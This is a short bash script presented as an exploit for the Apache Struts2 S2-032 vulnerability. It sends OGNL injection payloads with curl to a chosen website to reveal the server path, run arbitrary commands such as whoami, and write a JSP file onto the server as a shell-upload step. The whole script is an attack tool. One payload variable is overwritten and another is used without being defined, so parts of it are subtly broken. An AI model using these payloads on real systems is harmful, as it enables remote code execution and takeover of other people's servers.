#!/bin/bash
#apache s2-032 exploit
#
function help(){
        echo "usage : ./struct website command"
        echo "example: ./struct www.xx.com/index.action whoami"
	echo "example: ./struct www.xx.com.index.action upload upload"
}
if [ -z "$1" ]
then
  help
else
        echo "targer is ",$1
        echo "command is ",$2
        exp_getpath="?method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#req=@org.apache.struts2.ServletActionContext@getRequest(),#res=@org.apache.struts2.ServletActionContext@getResponse(),#path=#req.getRealPath(#parameters.pp[0]),#w=#res.getWriter(),#w.print(#path),1?#xx:#request.toString&pp=/&encoding=UTF-8"
        exp_upload="?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=stest.jsp&shellContent=tttt&encoding=UTF-8&pp=%2f"
	exp_getpath="?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23test%3d%23context.get(%23parameters.res%5b0%5d).getWriter()%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d).getInputStream()%2c%23c%3dnew+java.io.InputStreamReader(%23a)%2c%23d%3dnew+java.io.BufferedReader(%23c)%2c%23e%3dnew+char%5b50000%5d%2c%23d.read(%23e)%2c%23test.println(%23e)%2c%23test.flush()%2c%23test.close&res=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command="
	curl -g $1$exp_getpath
        curl -g $1$exp_command"whoami"
        if  [ "$2"x == "upload"x ];
        then 
            curl -g $1$exp_upload
            echo "upload success"
            exit     
        fi 
        
        curl -g $1$exp_command$2
fi

